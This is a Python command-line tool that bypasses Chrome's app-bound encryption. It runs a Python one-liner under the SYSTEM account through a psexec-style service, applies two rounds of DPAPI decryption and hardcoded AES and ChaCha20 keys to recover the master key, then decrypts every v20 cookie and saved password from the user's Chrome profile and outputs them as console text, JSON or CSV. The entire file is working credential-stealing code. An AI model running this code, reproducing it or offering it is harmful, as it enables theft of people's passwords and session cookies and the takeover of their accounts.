import ctypes
import sys
import os
import json
import time
import binascii
import argparse
import logging
import csv
from datetime import datetime
from Crypto.Cipher import AES, ChaCha20_Poly1305
import sqlite3
import pathlib
from pypsexec.client import Client
from smbprotocol.exceptions import SMBResponseException

def setup_logging(verbose):
    """Configure logging based on verbosity."""
    level = logging.DEBUG if verbose else logging.INFO
    logging.basicConfig(level=level, format='%(asctime)s - %(levelname)s - %(message)s')

def is_admin():
    """Check if the script is running with administrator privileges."""
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except Exception as e:
        logging.error(f"Failed to check admin privileges: {e}")
        return False

def get_encryption_key():
    """Retrieve and decrypt the Chrome encryption key."""
    user_profile = os.environ.get('USERPROFILE')
    if not user_profile:
        logging.error("USERPROFILE environment variable not found.")
        sys.exit(1)

    local_state_path = rf"{user_profile}\AppData\Local\Google\Chrome\User Data\Local State"
    try:
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.load(f)
    except (FileNotFoundError, json.JSONDecodeError) as e:
        logging.error(f"Failed to read Local State file: {e}")
        sys.exit(1)

    app_bound_encrypted_key = local_state.get("os_crypt", {}).get("app_bound_encrypted_key")
    if not app_bound_encrypted_key:
        logging.error("App-bound encrypted key not found in Local State.")
        sys.exit(1)

    arguments = "-c \"" + """import win32crypt
import binascii
encrypted_key = win32crypt.CryptUnprotectData(binascii.a2b_base64('{}'), None, None, None, 0)
print(binascii.b2a_base64(encrypted_key[1]).decode())
""".replace("\n", ";") + "\""

    c = Client("localhost")
    try:
        c.connect()
        c.create_service()

        if binascii.a2b_base64(app_bound_encrypted_key)[:4] != b"APPB":
            logging.error("Invalid app-bound encrypted key format.")
            sys.exit(1)

        app_bound_encrypted_key_b64 = binascii.b2a_base64(
            binascii.a2b_base64(app_bound_encrypted_key)[4:]).decode().strip()

        # Decrypt with SYSTEM DPAPI
        encrypted_key_b64, stderr, rc = c.run_executable(
            sys.executable, arguments=arguments.format(app_bound_encrypted_key_b64), use_system_account=True
        )
        if rc != 0:
            logging.error(f"SYSTEM DPAPI decryption failed: {stderr.decode()}")
            sys.exit(1)

        # Decrypt with user DPAPI
        decrypted_key_b64, stderr, rc = c.run_executable(
            sys.executable, arguments=arguments.format(encrypted_key_b64.decode().strip()), use_system_account=False
        )
        if rc != 0:
            logging.error(f"User DPAPI decryption failed: {stderr.decode()}")
            sys.exit(1)

        decrypted_key = binascii.a2b_base64(decrypted_key_b64)[-61:]
    except Exception as e:
        logging.error(f"Error during key decryption process: {e}")
        sys.exit(1)
    finally:
        for _ in range(3):
            try:
                c.remove_service()
                break
            except SMBResponseException as e:
                if "STATUS_CANNOT_DELETE" in str(e):
                    logging.warning(f"Failed to remove service: {e}. Retrying...")
                    time.sleep(1)
                else:
                    logging.error(f"Failed to remove service: {e}")
                    sys.exit(1)
            except Exception as e:
                logging.error(f"Unexpected error during service removal: {e}")
                sys.exit(1)
        else:
            logging.warning("Failed to remove service after retries. Manual cleanup may be required.")
        c.disconnect()

    # Decrypt key with AES256GCM or ChaCha20Poly1305
    aes_key = bytes.fromhex("B31C6E241AC846728DA9C1FAC4936651CFFB944D143AB816276BCC6DA0284787")
    chacha20_key = bytes.fromhex("E98F37D7F4E1FA433D19304DC2258042090E2D1D7EEA7670D41F738D08729660")

    flag = decrypted_key[0]
    iv = decrypted_key[1:1+12]
    ciphertext = decrypted_key[1+12:1+12+32]
    tag = decrypted_key[1+12+32:]

    try:
        if flag == 1:
            cipher = AES.new(aes_key, AES.MODE_GCM, nonce=iv)
        elif flag == 2:
            cipher = ChaCha20_Poly1305.new(key=chacha20_key, nonce=iv)
        else:
            logging.error(f"Unsupported encryption flag: {flag}")
            sys.exit(1)
        key = cipher.decrypt_and_verify(ciphertext, tag)
    except ValueError as e:
        logging.error(f"Key decryption failed: {e}")
        sys.exit(1)

    return key

def decrypt_v20(encrypted_value, key, data_type="data"):
    """Decrypt v20 encrypted data (cookie or password) using AES256GCM."""
    try:
        iv = encrypted_value[3:3+12]
        encrypted_data = encrypted_value[3+12:-16]
        tag = encrypted_value[-16:]
        cipher = AES.new(key, AES.MODE_GCM, nonce=iv)
        decrypted_data = cipher.decrypt_and_verify(encrypted_data, tag)
        if data_type == "cookie":
            return decrypted_data[32:].decode('utf-8')
        return decrypted_data.decode('utf-8')
    except ValueError as e:
        logging.warning(f"Failed to decrypt {data_type}: {e}")
        return None

def fetch_cookies():
    """Fetch v20 cookies from Chrome's Cookies database."""
    user_profile = os.environ.get('USERPROFILE')
    cookie_db_path = rf"{user_profile}\AppData\Local\Google\Chrome\User Data\Default\Network\Cookies"
    try:
        con = sqlite3.connect(pathlib.Path(cookie_db_path).as_uri() + "?mode=ro", uri=True)
        cur = con.cursor()
        cur.execute("SELECT host_key, name, CAST(encrypted_value AS BLOB) FROM cookies;")
        cookies = cur.fetchall()
        cookies_v20 = [c for c in cookies if c[2][:3] == b"v20"]
        con.close()
        return cookies_v20
    except sqlite3.OperationalError as e:
        if "database is locked" in str(e):
            logging.error("Cookies database is locked. Please close Chrome and try again.")
            sys.exit(1)
        else:
            logging.error(f"Failed to fetch cookies: {e}")
            return []
    except Exception as e:
        logging.error(f"Unexpected error while fetching cookies: {e}")
        return []

def fetch_passwords():
    """Fetch v20 passwords from Chrome's Login Data database."""
    user_profile = os.environ.get('USERPROFILE')
    password_db_path = rf"{user_profile}\AppData\Local\Google\Chrome\User Data\Default\Login Data"
    try:
        con = sqlite3.connect(pathlib.Path(password_db_path).as_uri() + "?mode=ro", uri=True)
        cur = con.cursor()
        cur.execute("SELECT origin_url, username_value, CAST(password_value AS BLOB) FROM logins;")
        passwords = cur.fetchall()
        passwords_v20 = [p for p in passwords if p[2][:3] == b"v20"]
        con.close()
        return passwords_v20
    except sqlite3.OperationalError as e:
        if "database is locked" in str(e):
            logging.error("Passwords database is locked. Please close Chrome and try again.")
            sys.exit(1)
        else:
            logging.error(f"Failed to fetch passwords: {e}")
            return []
    except Exception as e:
        logging.error(f"Unexpected error while fetching passwords: {e}")
        return []

def output_data(cookies, passwords, output_format, output_file, key):
    """Output decrypted cookies and passwords in the specified format."""
    cookie_data = [
        {"host_key": c[0], "name": c[1], "value": decrypt_v20(c[2], key, "cookie")}
        for c in cookies
        if decrypt_v20(c[2], key, "cookie") is not None
    ]
    password_data = [
        {"origin_url": p[0], "username": p[1], "password": decrypt_v20(p[2], key, "password")}
        for p in passwords
        if decrypt_v20(p[2], key, "password") is not None
    ]

    if output_format == "json":
        output = {"cookies": cookie_data, "passwords": password_data}
        if output_file:
            try:
                with open(output_file, 'w', encoding='utf-8') as f:
                    json.dump(output, f, indent=2)
                logging.info(f"Data written to {output_file}")
            except IOError as e:
                logging.error(f"Failed to write JSON file: {e}")
                sys.exit(1)
        else:
            print(json.dumps(output, indent=2))
    elif output_format == "csv":
        if output_file:
            try:
                with open(output_file, 'w', newline='', encoding='utf-8') as f:
                    if cookie_data:
                        writer = csv.DictWriter(f, fieldnames=["host_key", "name", "value"])
                        writer.writeheader()
                        writer.writerows(cookie_data)
                    if password_data:
                        f.write("\n")
                        writer = csv.DictWriter(f, fieldnames=["origin_url", "username", "password"])
                        writer.writeheader()
                        writer.writerows(password_data)
                logging.info(f"Data written to {output_file}")
            except IOError as e:
                logging.error(f"Failed to write CSV file: {e}")
                sys.exit(1)
        else:
            if cookie_data:
                writer = csv.DictWriter(sys.stdout, fieldnames=["host_key", "name", "value"])
                writer.writeheader()
                writer.writerows(cookie_data)
            if password_data:
                print()
                writer = csv.DictWriter(sys.stdout, fieldnames=["origin_url", "username", "password"])
                writer.writeheader()
                writer.writerows(password_data)
    else:  # console
        if cookie_data:
            print("Decrypted Cookies:")
            for c in cookie_data:
                print(f"{c['host_key']} {c['name']} {c['value']}")
        if password_data:
            print("\nDecrypted Passwords:")
            for p in password_data:
                print(f"{p['origin_url']} {p['username']} {p['password']}")

def main():
    """Main function to orchestrate the script execution."""
    parser = argparse.ArgumentParser(description="Extract and decrypt Chrome cookies and passwords.")
    parser.add_argument("-o", "--output", choices=["console", "json", "csv"], default="console",
                        help="Output format (default: console)")
    parser.add_argument("-f", "--file", help="Output file name (default: chrome_data_YYYY-MM-DD.ext)")
    parser.add_argument("--no-cookies", action="store_true", help="Skip cookie extraction")
    parser.add_argument("--no-passwords", action="store_true", help="Skip password extraction")
    parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose output")

    args = parser.parse_args()
    setup_logging(args.verbose)

    if not is_admin():
        logging.error("This script requires administrator privileges to run.")
        sys.exit(1)

    key = get_encryption_key()
    logging.debug(f"Decrypted key: {binascii.b2a_base64(key).decode().strip()}")

    cookies = [] if args.no_cookies else fetch_cookies()
    passwords = [] if args.no_passwords else fetch_passwords()

    if not cookies and not passwords:
        logging.error("No data to process. Exiting.")
        sys.exit(1)

    output_file = args.file
    if not output_file:
        ext = {"json": "json", "csv": "csv", "console": "txt"}[args.output]
        output_file = f"chrome_data_{datetime.now().strftime('%Y-%m-%d')}.{ext}" if args.output != "console" else None

    output_data(cookies, passwords, args.output, output_file, key)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        logging.info("Script interrupted by user.")
        sys.exit(0)
    except Exception as e:
        logging.error(f"Unexpected error: {e}")
        sys.exit(1)
